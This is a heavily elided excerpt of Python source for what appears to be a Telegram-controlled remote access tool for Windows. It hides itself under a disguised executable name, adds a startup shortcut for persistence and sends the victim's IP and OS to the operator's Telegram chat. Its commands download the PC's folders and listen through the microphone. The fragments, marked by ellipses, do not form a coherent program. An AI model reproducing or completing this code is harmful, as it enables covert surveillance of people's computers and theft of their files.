...
# downloadfolder - download ALL folder from PC
# goweb - go to website
...
# volmute - mute
# downloadfolder - download folder from pc
...
hide_location = win_folder + r'\\' + 'Remote control for Windows V2.4.exe'
target_file = startup() + r'\\Remote control for Windows V2.4.lnk'
folder_name_time = 0
...
Связь установлена, отклик: 
            ...
            *IP:* {ip}
            *ОС:* {windows}'''
            bot.send_message(my_id_time, startmess, parse_mode="markdown")
        try:
...
def hear_process(message):
    ...
    sec = 0
    try:
        if is_digit(int(message.text)):
            min, sec = divmod(int(message.text), 60)
    except:
        min, sec = 0, int(message.text)
    bot.send_chat_action(my_id_time, 'typing')
    bot.send_message(my_id_time, f"Прослушивание началось...\nВремя ожидания: {min} мин. {sec+5} сек.")
    try:
...
def split_text_into_lines(text, max_length=100):
